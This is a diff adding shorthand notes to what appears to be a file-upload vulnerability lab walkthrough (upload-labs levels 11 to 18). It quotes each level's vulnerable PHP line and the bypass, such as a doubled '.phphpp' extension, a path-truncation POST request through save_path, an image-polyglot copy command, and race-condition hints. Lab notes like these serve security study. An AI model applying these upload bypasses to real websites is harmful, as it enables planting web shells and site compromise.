@@ -52,13 +52,36 @@ Pass-10
 		1.php. .
 		
 Pass-11
+	$file_name = str_ireplace($deny_ext,"", $file_name);
+		1.phphpp
+
 Pass-12
+	$img_path = $_GET['save_path']."/".rand(10, 99).date("YmdHis").".".$file_ext;
+		php<5.3.4  magic_quotes_gpc off 
+			POST /upload/Pass-12/index.php?save_path=../upload/1.php HTTP/1.1
+	
 Pass-13
+	$img_path = $_POST['save_path']."/".rand(10, 99).date("YmdHis").".".$file_ext;
+		php<5.3.4  magic_quotes_gpc off 
+			Content-Disposition: form-data; name="save_path"   ../upload/1.php
+				Hex
+				
 Pass-14
+	$strInfo = @unpack("C2chars", fread(fopen($filename, "rb"), 2););    
+		copy 1.jpg/b + 1.jpg/a 2.jpg
+	
 Pass-15
+	$info = getimagesize($filename);
+	
 Pass-16
+	$image_type = exif_imagetype($filename);
+	
 Pass-17
+	imagecreatefromgif(string $filename)
+	
 Pass-18
+	if(move_uploaded_file($temp_file, $upload_file)){}
+	
 Pass-19
 Pass-20
 Pass-21
